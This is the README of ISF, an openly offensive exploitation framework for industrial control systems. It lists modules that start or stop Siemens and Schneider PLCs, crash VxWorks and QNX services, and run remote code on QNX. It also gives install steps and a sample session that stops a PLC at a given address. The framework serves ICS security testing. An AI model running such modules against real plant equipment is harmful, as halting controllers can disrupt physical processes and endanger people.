# Industrial Exploitation Framework
ISF(Industrial Exploitation Framework) is a exploitation framework based on Python, it's similar to metasploit framework. 

ISF is based on open source project [routersploit](https://github.com/reverse-shell/routersploit).

*Read this in other languages: [English](README.md), [简体中文](README.zh-cn.md),*


## ICS Protocol Clients
| Name               | Path                                   | Description            |
| -------------------| ---------------------------------------|:----------------------:|  
| modbus_tcp_client  | icssploit/clients/modbus_tcp_client.py | Modbus-TCP Client      |
| wdb2_client        | icssploit/clients/wdb2_client.py       | WdbRPC Version 2 Client(Vxworks 6.x)|
| s7_client          | icssploit/clients/s7_client.py         | s7comm Client(S7 300/400 PLC)       |


## Exploit Module
| Name                    | Path                                                              | Description                              |
| ------------------------| ------------------------------------------------------------------|:----------------------------------------:|  
| s7_300_400_plc_control  | exploits/plcs/siemens/s7_300_400_plc_control.py                   | S7-300/400 PLC start/stop                |
| s7_1200_plc_control     | exploits/plcs/siemens/s7_1200_plc_control.py                      | S7-1200 PLC start/stop/reset             |
| vxworks_rpc_dos         | exploits/plcs/vxworks/vxworks_rpc_dos.py                          | Vxworks RPC remote dos（CVE-2015-7599）  |
| quantum_140_plc_control | exploits/plcs/schneider/quantum_140_plc_control.py                | Schneider Quantum 140 series PLC start/stop |
| crash_qnx_inetd_tcp_service | exploits/plcs/qnx/crash_qnx_inetd_tcp_service.py              | QNX Inetd TCP service dos               |
| qconn_remote_exec       | exploits/plcs/qnx/qconn_remote_exec.py                            | QNX qconn remote code execution         |
| profinet_set_ip         | exploits/plcs/siemens/profinet_set_ip.py                          | Profinet DCP device IP config           |


## Scanner Module
| Name                    | Path                                                              | Description                             |
| ------------------------| ------------------------------------------------------------------|:---------------------------------------:|  
| profinet_dcp_scan       | scanners/profinet_dcp_scan.py                                     | Profinet DCP scanner                    |
| vxworks_6_scan          | scanners/vxworks_6_scan.py                                        | Vxworks 6.x scanner                     |
| s7comm_scan             | scanners/s7comm_scan.py                                           | S7comm scanner                          |
| enip_scan               | scanners/enip_scan.py                                             | EthernetIP scanner                      |



## ICS Protocols Module (Scapy Module)
These protocol can used in other Fuzzing framework like [Kitty](https://github.com/cisco-sas/kitty) or create your own client.
 
| Name                    | Path                                                              | Description                             |
| ------------------------| ------------------------------------------------------------------|:---------------------------------------:|  
| pn_dcp                  | icssploit/protocols/pn_dcp                                        | Profinet DCP Protocol                   |
| modbus_tcp              | icssploit/protocols/modbus_tcp                                    | Modbus TCP Protocol                     |
| wdbrpc2                 | icssploit/protocols/wdbrpc2                                       | WDB RPC Version 2 Protocol              |
| s7comm                  | icssploit/protocols/s7comm.py                                     | S7comm Protocol                         |



# Install

## Python requirements
* gnureadline (OSX only)
* requests
* paramiko
* beautifulsoup4
* pysnmp
* python-nmap
* scapy [We suggest install scapy manual with this official document](http://scapy.readthedocs.io/en/latest/installation.html)

## Install on Kali
    git clone https://github.com/dark-lbp/isf/
    cd isf
    python isf.py


# Usage
        root@kali:~/Desktop/temp/isf# python isf.py
        
          _____ _____  _____ _____ _____  _      ____ _____ _______
         |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
           | || |    | (___| (___ | |__) | |   | |  | || |    | |
           | || |     \___ \\___ \|  ___/| |   | |  | || |    | |
          _| || |____ ____) |___) | |    | |___| |__| || |_   | |
         |_____\_____|_____/_____/|_|    |______\____/_____|  |_|
        
        
                        ICS Exploitation Framework
        
        Note     : ICSSPOLIT is fork from routersploit at
                   https://github.com/reverse-shell/routersploit
        Dev Team : wenzhe zhu(dark-lbp)
        Version  : 0.1.0
        
        Exploits: 2 Scanners: 0 Creds: 13
        
        ICS Exploits:
            PLC: 2          ICS Switch: 0
            Software: 0
        
        isf >

## Exploits
    isf > use exploits/plcs/
    exploits/plcs/siemens/  exploits/plcs/vxworks/
    isf > use exploits/plcs/siemens/s7_300_400_plc_control
    exploits/plcs/siemens/s7_300_400_plc_control
    isf > use exploits/plcs/siemens/s7_300_400_plc_control
    isf (S7-300/400 PLC Control) >
    
You can use the tab key for completion.


## Options
### Display module options:
    isf (S7-300/400 PLC Control) > show options
    
    Target options:
    
       Name       Current settings     Description
       ----       ----------------     -----------
       target                          Target address e.g. 192.168.1.1
       port       102                  Target Port
    
    
    Module options:
    
       Name        Current settings     Description
       ----        ----------------     -----------
       slot        2                    CPU slot number.
       command     1                    Command 0:start plc, 1:stop plc.
    
    
    isf (S7-300/400 PLC Control) >
    
### Set options
    isf (S7-300/400 PLC Control) > set target 192.168.70.210
    [+] {'target': '192.168.70.210'}
    

## Run module
    isf (S7-300/400 PLC Control) > run
    [*] Running module...
    [+] Target is alive
    [*] Sending packet to target
    [*] Stop plc
    isf (S7-300/400 PLC Control) >
    
## Display information about exploit
    isf (S7-300/400 PLC Control) > show info
    
    Name:
    S7-300/400 PLC Control
    
    Description:
    Use S7comm command to start/stop plc.
    
    Devices:
    -  Siemens S7-300 and S7-400 programmable logic controllers (PLCs)
    
    Authors:
    -  wenzhe zhu <jtrkid[at]gmail.com>
    
    References:
    
    isf (S7-300/400 PLC Control) >
    
# Documents
* [Modbus-TCP Client usage](docs/modbus_tcp_client.en-us.md)
* [WDBRPCV2 Client usage](docs/wdbrpc_v2_client.en-us.md)
* [S7comm Client usage](docs/s7_client.en-us.md)
* [SNMP_bruteforce usage](docs/snmp_bruteforce.en-us.md)
* [S7 300/400 PLC password bruteforce usage](docs/s7_bruteforce.en-us.md)
* [Vxworks 6.x Scanner usage](docs/vxworks_6_scan.en-us.md)
* [Profient DCP Scanner usage](docs/profinet_dcp_scan.en-us.md)
* [S7comm PLC Scanner usage](docs/s7comm_scan.en-us.md)
* [Profinet DCP Set ip module usage](docs/profinet_set_ip.en-us.md)
* [Load modules from extra folder](docs/load_extra_modules_from_folder.en-us.md)
* [How to write your own module](docs/how_to_create_module.en-us.md)